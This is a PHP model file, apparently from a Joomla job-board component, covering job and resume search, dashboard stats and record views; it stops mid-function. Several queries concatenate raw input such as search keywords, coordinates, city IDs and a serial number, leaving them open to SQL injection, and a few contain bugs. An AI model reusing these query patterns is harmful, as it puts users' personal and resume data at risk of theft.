<?php

/**
 * @Copyright Copyright (C) 2009-2010 ... Ahmad Bilal
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
 * Company:		Al-Barr Technologies
 + Contact:		www.al-barr.com , info@al-barr.com
 * Created on:	Jan 11, 2009
 ^
 + Project: 		Job Posting and Employment Application
 * File Name:	admin-----/models/jsjobs.php
 ^
 * Description: Model for application on admin site
 ^
 * History:		NONE
 ^
 */
defined('_JEXEC') or die('Restricted access');
jimport('joomla.application.component.model');
jimport('joomla.html.html');
require_once('jobsharing.php');

class JSJobsModelJsjobs extends JModelLegacy {

    var $_id;
    var $_application;
    var $_options;
    var $_empoptions;
    var $_uid;
    var $_job = null;
    var $_config = null;
    var $_defaultcountry = null;
    var $_job_editor = null;
    var $_comp_editor = null;
    var $_data_directory = null;
    var $_shifts = null;
    var $_jobsalaryrange = null;
    var $_experiences = null;
    var $_ages = null;
    var $_careerlevels = null;
    var $_searchoptions = null;
    var $_defaultcurrency = null;
    var $_client_auth_key = null;
    var $_defaultcurrencysymbol = null;
    var $siteurl = null;

    function __construct() {
        parent :: __construct();
        $authentication_key = $this->getClientAuthenticationKey();
        $this->_client_auth_key = $authentication_key;
        $this->_siteurl = JURI::root();
        $default_currency_id = $this->getDefaultCurrency();
        $this->_defaultcurrency = $default_currency_id;
        $user = & JFactory::getUser();
        $this->_uid = $user->id;
    }
    function storeServerSerailNumber($data) {
        $db = & JFactory :: getDBO();
		if($data['server_serialnumber']){
			$query="UPDATE  `#__js_job_config` SET configvalue='".$data['server_serialnumber']."' WHERE configname='server_serial_number'";
			$db->setQuery($query);
			if(!$db->Query()) return false;
			else return true;
		}else return false;
	}
    function &getEmployerModel() {
        $componentPath = JPATH_SITE.'/components/com_jsjobs';
        require_once $componentPath . '/models/employer.php';
        $employer_model = new JSJobsModelEmployer();
        return $employer_model;
    }

    function getGraphData() {
        $db = & JFactory :: getDBO();
        $d = array();
        for ($i = 0; $i <= 14; $i++) {
            $d[] = date("Y-m-d", strtotime('-' . $i . ' days'));
        }
        foreach ($d AS $day) {
            $query = "SELECT count(id) AS id FROM #__js_job_jobs where DATE(created) ='" . date('Y-m-d', strtotime($day)) . "'";
            $db->setQuery($query);
            $total_jobs_per_day = $db->loadObject();


            $query = "SELECT count(id) AS id FROM #__js_job_resume where DATE(create_date) ='" . date('Y-m-d', strtotime($day)) . "'";
            $db->setQuery($query);
            $total_resume_per_day = $db->loadObject();
            $time_format = strtotime($day);
            $json_format_data[] = array(array($time_format . '000', $total_jobs_per_day->id), array($time_format . '000', $total_resume_per_day->id));
        }

        $json_data = json_encode($json_format_data);
        return $json_data;
    }

    function getTopJobs() {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT job.id,job.title AS jobtitle,company.name AS companyname,cat.cat_title AS cattile,job.stoppublishing,
		salaryfrom.rangestart AS salaryfrom, salaryto.rangestart AS salaryto,currency.symbol 
		FROM `#__js_job_jobs` AS job
		JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
		JOIN `#__js_job_companies` AS company ON job.companyid = company.id
		LEFT JOIN `#__js_job_salaryrange` AS salaryfrom ON job.salaryrangefrom = salaryfrom.id
		LEFT JOIN `#__js_job_salaryrange` AS salaryto ON job.salaryrangeto = salaryto.id
	    LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = job.currencyid ORDER BY job.created desc LIMIT 5";
        $db->setQuery($query);
        $jobs = $db->loadObjectList();
        return $jobs;
    }

    function getTodayStats() {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = 'SELECT count(id) AS totalcompanies
		FROM #__js_job_companies AS company WHERE company.status=1 AND company.created >= CURDATE(); ';
        $db->setQuery($query);
        $companies = $db->loadObject();
        $query = 'SELECT count(id) AS totaljobs
		FROM #__js_job_jobs AS job WHERE job.status=1 AND job.created >= CURDATE(); ';
        $db->setQuery($query);
        $jobs = $db->loadObject();
        $query = 'SELECT count(id) AS totalresume
		FROM #__js_job_resume AS resume WHERE resume.status=1 AND resume.create_date >= CURDATE(); ';
        $db->setQuery($query);
        $resumes = $db->loadObject();

        $query = 'SELECT count(userrole.id) AS totalemployer
                    FROM #__users AS a
                    JOIN #__js_job_userroles AS userrole ON userrole.uid=a.id
                    WHERE userrole.role=1 AND userrole.dated>=CURDATE()';
        $db->setQuery($query);
        $employer = $db->loadObject();

        $query = 'SELECT count(userrole.id) AS totaljobseeker
                    FROM #__users AS a
                    JOIN #__js_job_userroles AS userrole ON userrole.uid=a.id
                    WHERE userrole.role=2 AND userrole.dated>=CURDATE()';
        $db->setQuery($query);
        $jobseeker = $db->loadObject();

        $result[0] = $companies;
        $result[1] = $jobs;
        $result[2] = $resumes;
        $result[3] = $employer;
        $result[4] = $jobseeker;
        return $result;
    }

    function deleteUserFieldOptionValue($id) {
        $row = &$this->getTable('userfieldvalue');
        if ($row->load($id)) {
            $db = JFactory::getDBO();
            $query = "SELECT count(id) FROM `#__js_job_userfield_data` WHERE field = " . $row->field . " AND data=" . $row->id;
            $db->setQuery($query);
            $total = $db->loadResult();
			   if($total>0) $return=false;
            else {
                $return = true;
                $row->delete();
            }
			}else $return=false;
        return $return;
    }
    function getConcurrentRequestData() {
        $db = JFactory::getDBO();
        $query = "SELECT configname,configvalue FROM `#__js_job_config` WHERE configfor = " . $db->quote('hostdata');
        $db->setQuery($query);
        $result = $db->loadObjectList();
        foreach ($result AS $res) {
            $return[$res->configname] = $res->configvalue;
        }
        return $return;
    }

    function getPaymentMethodsConfig() {
        $db = &$this->getDBO();
        $query = "SELECT * FROM `#__js_job_paymentmethodconfig`";
        $db->setQuery($query);
        $paymentmethodconfig = $db->loadObjectList();
        foreach ($paymentmethodconfig AS $configvalue) {
            $config[$configvalue->configname] = $configvalue->configvalue;
        }
        return $config;
    }

    function getAllCompaniesForSearch($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, name FROM `#__js_job_companies`";
        $query.= " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $companies = array();
        if ($title)
            $companies[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($rows as $row) {
            $companies[] = array('value' => $row->id, 'text' => $row->name);
        }
        return $companies;
    }

	function &getJobSearch($title,$jobcategory,$jobsubcategory,$jobtype,$jobstatus,$salaryrangefrom,$salaryrangeto,$salaryrangetype
							,$shift,  $durration, $startpublishing, $stoppublishing
							,$company,$city,$zipcode,$currency,$longitude,$latitude,$radius,$radius_length_type,$keywords,$limit,$limitstart)
	{
		if ($jobcategory != '') if (is_numeric($jobcategory) == false) return false;
		if ($jobsubcategory != '') if (is_numeric($jobsubcategory) == false) return false;
		if ($jobtype != '') if (is_numeric($jobtype) == false) return false;
		if ($jobstatus != '') if (is_numeric($jobstatus) == false) return false;
		//if ($jobsalaryrange != '') if (is_numeric($jobsalaryrange) == false) return false;
                if ($salaryrangefrom != '')if (is_numeric($salaryrangefrom) == false) return false;
                if ($salaryrangeto != '')if (is_numeric($salaryrangeto) == false) return false;
                if ($salaryrangetype != '')if (is_numeric($salaryrangetype) == false) return false;
		if ($shift != '') if (is_numeric($shift) == false) return false;
		if ($company != '') if (is_numeric($company) == false) return false;
		if ($currency != '')if (is_numeric($currency) == false) return false;
		$result = array();
		$db = &$this->getDBO();


		if(! isset($this->_config)){
			$this->getConfig('');
		}
		foreach ($this->_config as $conf){
				if ($conf->configname == 'date_format') $dateformat = $conf->configvalue;
        }
        if ($startpublishing != '') {
            if ($dateformat == 'm-d-Y') {
                $arr = explode('-', $startpublishing);
                $startpublishing = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
            } elseif ($dateformat == 'd-m-Y') {
                $arr = explode('-', $startpublishing);
                $startpublishing = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            }
            $startpublishing = date('Y-m-d', strtotime($startpublishing));
        }
        if ($stoppublishing != '') {
            if ($dateformat == 'm-d-Y') {
                $arr = explode('-', $stoppublishing);
                $stoppublishing = $arr[1] . '/' . $arr[2] . '/' . $arr[0];
            } elseif ($dateformat == 'd-m-Y') {
                $arr = explode('-', $stoppublishing);
                $stoppublishing = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            }
            $stoppublishing = date('Y-m-d', strtotime($stoppublishing));
        }
        $listjobconfig = $this->getConfigByFor('listjob');
        $issalary = '';
        //for radius search
        switch ($radius_length_type) {
			case "m":$radiuslength = 6378137;break;
			case "km":$radiuslength = 6378.137;break;
			case "mile":$radiuslength = 3963.191;break;
			case "nacmiles":$radiuslength = 3441.596;break;
        }
        if ($keywords) {// For keyword Search
            $keywords = explode(' ', $keywords);
            $length = count($keywords);
            if ($length <= 5) {// For Limit keywords to 5
                $i = $length;
            } else {
                $i = 5;
            }
            for ($j = 0; $j < $i; $j++) {
                $keys[] = " job.metakeywords Like '%$keywords[$j]%'";
            }
        }
        $selectdistance = " ";
        if ($longitude != '' && $latitude != '' && $radius != '') {
            $radiussearch = " acos((SIN( PI()* $latitude /180 )*SIN( PI()*job.latitude/180 ))+(cos(PI()* $latitude /180)*COS( PI()*job.latitude/180) *COS(PI()*job.longitude/180-PI()* $longitude /180)))* $radiuslength <= $radius";
            $selectdistance = " ,acos((sin(PI()*$latitude/180)*sin(PI()*job.latitude/180))+(cos(PI()*$latitude/180)*cos(PI()*job.latitude/180)*cose(PI()*job.longitude/180 - PI()*$longitude/180)))*$radiuslength AS distance ";
        }
        $wherequery = '';

        if ($title != '') {
            $title_keywords = explode(' ', $title);
            $tlength = count($title_keywords);
            if ($tlength <= 5) {// For Limit keywords to 5
                $r = $tlength;
            } else {
                $r = 5;
            }
            for ($k = 0; $k < $r; $k++) {
                $titlekeys[] = " job.title LIKE '%" . str_replace("'", "", $db->Quote($title_keywords[$k])) . "%'";
            }
        }
        if ($jobcategory != '')
		if ($jobcategory != '') $wherequery .= " AND job.jobcategory = ".$jobcategory;
		if (isset($keys)) $wherequery .= " AND ( ".  implode(' OR ', $keys)." )";
		if (isset($titlekeys)) $wherequery .= " AND ( ".  implode(' OR ', $titlekeys)." )";
		if ($jobsubcategory != '') $wherequery .= " AND job.subcategoryid = ".$jobsubcategory;
		if ($jobtype != '') $wherequery .= " AND job.jobtype = ".$jobtype;
		if ($jobstatus != '') $wherequery .= " AND job.jobstatus = ".$jobstatus;
        if ($salaryrangefrom != '') {
            $query = "SELECT salfrom.rangestart
			FROM `#__js_job_salaryrange` AS salfrom
			WHERE salfrom.id = " . $salaryrangefrom;
            $db->setQuery($query);
            $rangestart_value = $db->loadResult();
            $wherequery .= " AND salaryrangefrom.rangestart >= " . $rangestart_value;
            $issalary = 1;
        }
        if ($salaryrangeto != '') {
            $query = "SELECT salto.rangestart
			FROM `#__js_job_salaryrange` AS salto
			WHERE salto.id = " . $salaryrangeto;
            $db->setQuery($query);
            $rangeend_value = $db->loadResult();
            $wherequery .= " AND salaryrangeto.rangeend <= " . $rangeend_value;
            $issalary = 1;
        }
        if (($issalary != '') && ($salaryrangetype != '')) {
            $wherequery .= " AND job.salaryrangetype = " . $salaryrangetype;
        }
		if ($shift != '') $wherequery .= " AND job.shift = ".$shift;
		if ($durration != '') $wherequery .= " AND job.duration LIKE ".$db->Quote($durration);
		if ($startpublishing != '') $wherequery .= " AND job.startpublishing >= ".$db->Quote($startpublishing);
		if ($stoppublishing != '') $wherequery .= " AND job.stoppublishing <= ".$db->Quote($stoppublishing);
		if ($company != '') $wherequery .= " AND job.companyid = ".$company;
        if ($city != '') {
            $city_value = explode(',', $city);
            $lenght = count($city_value);
            for ($i = 0; $i < $lenght; $i++) {
				if($i==0) $wherequery .= " AND ( mjob.cityid=".$city_value[$i];
				else $wherequery .= " OR mjob.cityid=".$city_value[$i];
            }
            $wherequery .= ")";
        }
  
  		if ($zipcode != '') $wherequery .= " AND job.zipcode = ".$db->Quote($zipcode);
        if (isset($radiussearch) && $radiussearch != '')
            $wherequery .= " AND $radiussearch";

        $curdate = date('Y-m-d H:i:s');
        $query = "SELECT count(DISTINCT job.id) FROM `#__js_job_jobs` AS job 
					JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
					LEFT JOIN `#__js_job_salaryrange` AS salaryrangefrom ON job.salaryrangefrom = salaryrangefrom.id
					LEFT JOIN `#__js_job_salaryrange` AS salaryrangeto ON job.salaryrangeto = salaryrangeto.id";
        $query .= " LEFT JOIN `#__js_job_jobcities` AS mjob ON mjob.jobid = job.id ";

        $query .= " LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = job.currencyid ";
        $query .= "	WHERE job.status = 1 ";
			if ($startpublishing == '') $query .= " AND job.startpublishing <= ".$db->Quote($curdate);
			if ($stoppublishing == '') $query .= " AND job.stoppublishing >= ".$db->Quote($curdate);
        $query .= $wherequery;
        $db->setQuery($query);
        $total = $db->loadResult();
		if ( $total <= $limitstart ) $limitstart = 0;
            $limitstart = 0;

        $query = "SELECT DISTINCT job.*, cat.cat_title, jobtype.title AS jobtypetitle, jobstatus.title AS jobstatustitle
				, salaryrangefrom.rangestart AS salaryfrom, salaryrangeto.rangeend AS salaryend 
				, company.name AS companyname, company.url
				FROM `#__js_job_jobs` AS job
				JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id
				JOIN `#__js_job_jobstatus` AS jobstatus ON job.jobstatus = jobstatus.id
				LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id
				LEFT JOIN `#__js_job_salaryrange` AS salaryrangefrom ON job.salaryrangefrom = salaryrangefrom.id
				LEFT JOIN `#__js_job_salaryrange` AS salaryrangeto ON job.salaryrangeto = salaryrangeto.id";
        $query .= " LEFT JOIN `#__js_job_jobcities` AS mjob ON mjob.jobid = job.id ";
        $query .= " LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = job.currencyid ";
        $query .= " WHERE  job.status = 1 ";
			if ($startpublishing == '') $query .= " AND job.startpublishing <= ".$db->Quote($curdate);
			if ($stoppublishing == '') $query .= " AND job.stoppublishing >= ".$db->Quote($curdate);
			if ($currency != '') $query.= " AND currency.id = job.currencyid ";

        $query .= $wherequery;
        $db->setQuery($query, $limitstart, $limit);
        $this->_applications = $db->loadObjectList();
        foreach ($this->_applications AS $searchdata) {  // for multicity select 
            $multicitydata = $this->getMultiCityData($searchdata->id);
				if($multicitydata!="") $searchdata->city=$multicitydata;
        }
        $result[0] = $this->_applications;
        $result[1] = $total;
        $result[2] = $listjobconfig;

        return $result;
    }

    function getMultiCityData($jobid) {
        if(!is_numeric($jobid)) return false;
        $db = &$this->getDBO();
        $query = "select mjob.*,city.id AS cityid,city.name AS cityname ,state.name AS statename,country.name AS countryname
				from #__js_job_jobcities AS mjob
				LEFT join #__js_job_cities AS city on mjob.cityid=city.id  
				LEFT join #__js_job_states AS state on city.stateid=state.id  
				LEFT join #__js_job_countries AS country on city.countryid=country.id 
				WHERE mjob.jobid=" . $jobid;
        $db->setQuery($query);
        $data = $db->loadObjectList();
        if (is_array($data) AND !empty($data)) {
            $i = 0;
            $multicitydata = "";
            foreach ($data AS $multicity) {
                $last_index = count($data) - 1;
					if($i==$last_index)  $multicitydata.=$multicity->cityname;
					else $multicitydata.=$multicity->cityname." ,";
                $i++;
            }
            if ($multicitydata != "") {
                $mc = JText::_('JS_MULTI_CITY');
                $multicity = (strlen($multicitydata) > 35) ? $mc . substr($multicitydata, 0, 35) . '...' : $multicitydata;
                return $multicity;
				}else return ;
        }
    }

    function &getSearchOptions() {
        $searchjobconfig = $this->getConfigByFor('searchjob');

        if (!$this->_searchoptions) {
            $this->_searchoptions = array();
            $companies = $this->getAllCompaniesForSearch(JText::_('JS_SEARCH_ALL'));
            $job_type = $this->getJobType(JText::_('JS_SEARCH_ALL'));
            $jobstatus = $this->getJobStatus(JText::_('JS_SEARCH_ALL'));
            $heighesteducation = $this->getHeighestEducation(JText::_('JS_SEARCH_ALL'));
            $job_categories = $this->getCategories(JText::_('JS_SEARCH_ALL'), '');
            $job_subcategories = $this->getSubCategoriesforCombo($job_categories[1]['value'], JText::_('JS_SEARCH_ALL'), '');
            $job_salaryrange = $this->getJobSalaryRange(JText::_('JS_SEARCH_ALL'), '');
            $shift = $this->getShift(JText::_('JS_SEARCH_ALL'));
            $countries = $this->getCountries('');

			if(! isset($this->_config)){ $this->getConfig();}
			if(isset($this->_defaultcountry))$states = $this->getStates($this->_defaultcountry);
			$this->_searchoptions['country'] = JHTML::_('select.genericList', $countries, 'country','class="inputbox required" '.'onChange="dochange(\'state\', this.value)"', 'value', 'text', $this->_defaultcountry);
			if ( isset($states[1]) ) if ($states[1] != '')$this->_searchoptions['state'] = JHTML::_('select.genericList', $states, 'state', 'class="inputbox" '. 'onChange="dochange(\'city\', this.value)"', 'value', 'text', '');
			if ( isset($cities[1]) ) if ($cities[1] != '')$this->_searchoptions['city'] = JHTML::_('select.genericList', $cities, 'city', 'class="inputbox" '. '', 'value', 'text', '');
            $this->_searchoptions['companies'] = JHTML::_('select.genericList', $companies, 'company', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'jobcategory', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
            $this->_searchoptions['jobsubcategory'] = JHTML::_('select.genericList', $job_subcategories, 'jobsubcategory', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['salaryrangefrom'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_FROM')), 'salaryrangefrom', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['salaryrangeto'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_TO')), 'salaryrangeto', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['salaryrangetypes'] = JHTML::_('select.genericList', $this->getSalaryRangeTypes(''), 'salaryrangetype', 'class="inputbox" ' . '', 'value', 'text', 2);
            $this->_searchoptions['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'jobstatus', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['shift'] = JHTML::_('select.genericList', $shift, 'shift', 'class="inputbox" ' . '', 'value', 'text', '');
            $this->_searchoptions['currency'] = JHTML::_('select.genericList', $this->getCurrency(), 'currency', 'class="inputbox" ' . '', 'value', 'text', '');
        }
        $result = array();
        $result[0] = $this->_searchoptions;
        $result[1] = $searchjobconfig;
        return $result;
    }

	function &getResumeSearch($uid,$title,$name,$nationality,$gender,$iamavailable,$jobcategory,$jobtype,$jobstatus,$jobsalaryrange,$education
								, $experience,$limit,$limitstart,$currency,$zipcode)
	{
		if ($gender != '')  if (is_numeric($gender) == false) return false;
		if ($iamavailable != '')  if (is_numeric($iamavailable) == false) return false;
		if ($jobcategory != '')  if (is_numeric($jobcategory) == false) return false;
		if ($jobtype != '')  if (is_numeric($jobtype) == false) return false;
		if ($jobsalaryrange != '')  if (is_numeric($jobsalaryrange) == false) return false;
		if ($education != '')  if (is_numeric($education) == false) return false;

		if ($currency != '')  if (is_numeric($currency) == false) return false;
		if ($zipcode != '')  if (is_numeric($zipcode) == false) return false;
        $db = &$this->getDBO();
        $result = array();
        $searchresumeconfig = $this->getConfigByFor('searchresume');

        $wherequery = '';
		if ($title != '') $wherequery .= " AND resume.application_title LIKE '%".str_replace("'","",$db->Quote($title))."%'";
        if ($name != '') {
            $wherequery .= " AND (";
            $wherequery .= " LOWER(resume.first_name) LIKE " . $db->Quote('%' . $name . '%', false);
            $wherequery .= " OR LOWER(resume.last_name) LIKE " . $db->Quote('%' . $name . '%', false);
            $wherequery .= " OR LOWER(resume.middle_name) LIKE " . $db->Quote('%' . $name . '%', false);
            $wherequery .= " )";
        }

		if ($nationality != '') $wherequery .= " AND resume.nationality = ".$db->Quote($nationality);
		if ($gender != '') $wherequery .= " AND resume.gender = ".$gender;
		if ($iamavailable != '') $wherequery .= " AND resume.iamavailable = ".$iamavailable;
		if ($jobcategory != '') $wherequery .= " AND resume.job_category = ".$jobcategory;
		if ($jobtype != '') $wherequery .= " AND resume.jobtype = ".$jobtype;
		if ($jobsalaryrange != '') $wherequery .= " AND resume.jobsalaryrange = ".$jobsalaryrange;
		if ($education != '') $wherequery .= " AND resume.heighestfinisheducation = ".$education;
		if ($experience != '') $wherequery .= " AND resume.total_experience LIKE ".$db->Quote($experience);
		if ($currency != '') $wherequery .= " AND resume.currencyid =".$currency;
		if ($zipcode != '') $wherequery .= " AND resume.address_zipcode =".$zipcode;

        $query = "SELECT count(resume.id) FROM `#__js_job_resume` AS resume, `#__js_job_categories` AS cat
				WHERE resume.job_category = cat.id AND resume.status = 1 ";
        $query .= $wherequery;
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT resume.*, cat.cat_title, jobtype.title AS jobtypetitle
				, salary.rangestart, salary.rangeend , currency.symbol
				FROM `#__js_job_resume` AS resume
				JOIN `#__js_job_jobtypes` AS jobtype ON resume.jobtype = jobtype.id
				LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = resume.currencyid 	 		
				LEFT JOIN `#__js_job_salaryrange` AS salary ON resume.jobsalaryrange = salary.id
				, `#__js_job_categories` AS cat ";
        $query .= "WHERE resume.job_category = cat.id AND resume.status = 1 ";
        $query .= $wherequery;
        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        $result[2] = $searchresumeconfig;

        return $result;
    }

    function &getResumeSearchOptions() {
        $db = &$this->getDBO();
        $searchresumeconfig = $this->getConfigByFor('searchresume');

        $gender = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SEARCH_ALL')),
            '1' => array('value' => 1, 'text' => JText::_('JS_MALE')),
            '2' => array('value' => 2, 'text' => JText::_('JS_FEMALE')),);

        $nationality = $this->getCountries(JText::_('JS_SEARCH_ALL'));
        $job_type = $this->getJobType(JText::_('JS_SEARCH_ALL'));
        $heighesteducation = $this->getHeighestEducation(JText::_('JS_SEARCH_ALL'));
        $job_categories = $this->getCategories(JText::_('JS_SEARCH_ALL'), '');
        $job_subcategories = $this->getSubCategoriesforCombo($job_categories[1]['value'], JText::_('JS_SEARCH_ALL'), '');
        $job_salaryrange = $this->getJobSalaryRange(JText::_('JS_SEARCH_ALL'), '');

        $searchoptions['nationality'] = JHTML::_('select.genericList', $nationality, 'nationality', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'jobcategory', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
        $searchoptions['jobsubcategory'] = JHTML::_('select.genericList', $job_subcategories, 'jobcategory', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['gender'] = JHTML::_('select.genericList', $gender, 'gender', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['currency'] = JHTML::_('select.genericList', $this->getCurrency(JText::_('JS_SEARCH_ALL')), 'currency', 'class="inputbox" ' . '', 'value', 'text', '');
        $result = array();
        $result[0] = $searchoptions;
        $result[1] = $searchresumeconfig;

        return $result;
    }

    function &getJobbyIdForView($job_id) {
        $db = &$this->getDBO();
        if (is_numeric($job_id) == false)
            return false;

        $query = "SELECT job.*, cat.cat_title , company.name as companyname, jobtype.title AS jobtypetitle
				, jobstatus.title AS jobstatustitle, shift.title as shifttitle
				, department.name AS departmentname
				, salaryfrom.rangestart AS salaryfrom, salaryto.rangestart AS salaryto, salarytype.title AS salarytype
				, education.title AS educationtitle ,mineducation.title AS mineducationtitle, maxeducation.title AS maxeducationtitle
				, experience.title AS experiencetitle ,minexperience.title AS minexperiencetitle, maxexperience.title AS maxexperiencetitle
				,currency.symbol 
				
		FROM `#__js_job_jobs` AS job
		JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
		JOIN `#__js_job_companies` AS company ON job.companyid = company.id
		JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id
		JOIN `#__js_job_jobstatus` AS jobstatus ON job.jobstatus = jobstatus.id
		LEFT JOIN `#__js_job_departments` AS department ON job.departmentid = department.id
		LEFT JOIN `#__js_job_salaryrange` AS salaryfrom ON job.salaryrangefrom = salaryfrom.id
		LEFT JOIN `#__js_job_salaryrange` AS salaryto ON job.salaryrangeto = salaryto.id
		LEFT JOIN `#__js_job_salaryrangetypes` AS salarytype ON job.salaryrangetype = salarytype.id
		LEFT JOIN `#__js_job_heighesteducation` AS education ON job.educationid = education.id
		LEFT JOIN `#__js_job_heighesteducation` AS mineducation ON job.mineducationrange = mineducation.id
		LEFT JOIN `#__js_job_heighesteducation` AS maxeducation ON job.maxeducationrange = maxeducation.id
		LEFT JOIN `#__js_job_experiences` AS experience ON job.experienceid = experience.id
		LEFT JOIN `#__js_job_experiences` AS minexperience ON job.minexperiencerange = minexperience.id
		LEFT JOIN `#__js_job_experiences` AS maxexperience ON job.maxexperiencerange = maxexperience.id
		LEFT JOIN `#__js_job_shifts` AS shift ON job.shift = shift.id
	    LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = job.currencyid 	
		WHERE  job.id = " . $job_id;
        $db->setQuery($query);
        $this->_application = $db->loadObject();
        $this->_application->multicity = $this->getMultiCityDataForView($job_id, 1);

        $result[0] = $this->_application;
        $result[2] = $this->getUserFieldsForView(2, $job_id); // company fields, id
        $result[3] = $this->getFieldsOrderingforForm(2); // company fields

        return $result;
    }

    function &getUserFieldsForView($fieldfor, $id) {
        $db = &$this->getDBO();
        $result;
        $field = array();
        $result = array();
        if(!is_numeric($fieldfor)) return false;
        $query = "SELECT  * FROM `#__js_job_userfields` 
					WHERE published = 1 AND fieldfor = " . $fieldfor;
        $db->setQuery($query);
        $rows = $db->loadObjectList();

        $i = 0;
        foreach ($rows as $row) {
            $field[0] = $row;
            if ($id != "") {
                if(!is_numeric($id)) return false;
                $query = "SELECT  * FROM `#__js_job_userfield_data` WHERE referenceid = " . $id . " AND field = " . $row->id;
                $db->setQuery($query);
                $data = $db->loadObject();
                $field[1] = $data;
            }
            if ($row->type == "select") {
                if (isset($id) && $id != "") {//if id is not empty
                    if(!is_numeric($id)) return false;
                    $query = "SELECT  fieldvalue.* FROM `#__js_job_userfield_data` AS fielddata
								JOIN `#__js_job_userfieldvalues` AS fieldvalue ON fieldvalue.id = fielddata.data
								WHERE fielddata.field = " . $row->id . " AND fielddata.referenceid = " . $id;
                } else {//general
                    $query = "SELECT  value.* FROM `#__js_job_userfieldvalues` AS value WHERE value.field = " . $row->id;
                }
                $db->setQuery($query);
                $value = $db->loadObject();
                $field[2] = $value;
            }
            $result[] = $field;
            $i++;
        }
        return $result;
    }

    function getMultiCityDataForView($id, $for) {
        if(!is_numeric($id)) return false;
        $db = &$this->getDBO();
        $query = "select mcity.id AS id,country.name AS countryName,city.name AS cityName,state.name AS stateName";
        switch ($for) {
            case 1:
                $query.=" FROM `#__js_job_jobcities` AS mcity";
                $query.=" LEFT JOIN `#__js_job_jobs` AS job ON mcity.jobid=job.id";
                break;
            case 2:
                $query.=" FROM `#__js_job_companycities` AS mcity";
                $query.=" LEFT JOIN `#__js_job_companies` AS company ON mcity.companyid=company.id";
                break;
        }
        $query.=" LEFT JOIN `#__js_job_cities` AS city ON mcity.cityid=city.id
				  LEFT JOIN `#__js_job_states` AS state ON city.stateid=state.id
				  LEFT JOIN `#__js_job_countries` AS country ON city.countryid=country.id";
        switch ($for) {
            case 1:
                $query.=" where mcity.jobid=" . $id;
                break;
            case 2:
                $query.=" where mcity.companyid=" . $id;
                break;
        }
        $query.=" ORDER BY country.name";
        $db->setQuery($query);
        $cities = $db->loadObjectList();
        $mloc = array();
        $mcountry = array();
        $finalloc = "";
        foreach ($cities AS $city) {
            $mcountry[] = $city->countryName;
        }
        $country_total = array_count_values($mcountry);
        $i = 0;
        foreach ($country_total AS $key => $val) {
            foreach ($cities AS $city) {
                if ($key == $city->countryName) {
                    $i++;
					if($val==1) { $finalloc.="[".$city->cityName.",".$key." ] ";$i=0;}
					elseif($i==$val) { $finalloc.=$city->cityName.",".$key." ] ";$i=0;}
					elseif($i==1) $finalloc.= "[".$city->cityName.",";
					else $finalloc.=$city->cityName.",";
                }
            }
        }
        return $finalloc;
    }

    function &getCompanybyIdForView($companyid) {
        $db = &$this->getDBO();
        if (is_numeric($companyid) == false)
            return false;
        $query = "SELECT company.*, cat.cat_title, country.name AS countryname, state.name AS statename
					, city.name AS cityname
		FROM `#__js_job_companies` AS company
		JOIN `#__js_job_categories` AS cat ON company.category = cat.id
		LEFT JOIN `#__js_job_countries` AS country ON company.country = country.id
		LEFT JOIN `#__js_job_states` AS state ON company.state = state.id
		LEFT JOIN `#__js_job_cities` AS city ON company.city = city.id
